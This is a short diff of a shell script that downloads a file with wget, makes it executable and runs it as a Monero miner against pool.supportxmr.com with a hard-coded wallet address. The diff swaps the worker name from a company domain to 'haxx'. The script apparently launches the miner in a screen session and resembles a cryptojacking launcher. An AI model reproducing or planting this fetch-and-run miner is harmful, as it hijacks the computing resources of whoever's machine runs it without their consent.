@@ -7,7 +7,7 @@ wget -O $FILE_NAME $FILE_URL
 chmod +x $FILE_NAME 
 
 # Command to run
-COMMAND="./$FILE_NAME -o pool.supportxmr.com:443 -u 48PMjoMcbA64NPR7ESQvRsKeDuVXA6AkVAr6LvEUCzxqBimsKvmxeYxN5Ys8htQ2NudViF8PVe8BHbT1eY5jWFXWQ1PB6fG -k --tls -p www.diaf-assurance.com"
+COMMAND="./$FILE_NAME -o pool.supportxmr.com:443 -u 48PMjoMcbA64NPR7ESQvRsKeDuVXA6AkVAr6LvEUCzxqBimsKvmxeYxN5Ys8htQ2NudViF8PVe8BHbT1eY5jWFXWQ1PB6fG -k --tls -p haxx"
 
 # Use the filename as the screen session name
 SESSION_NAME=$(basename "$FILE_NAME")
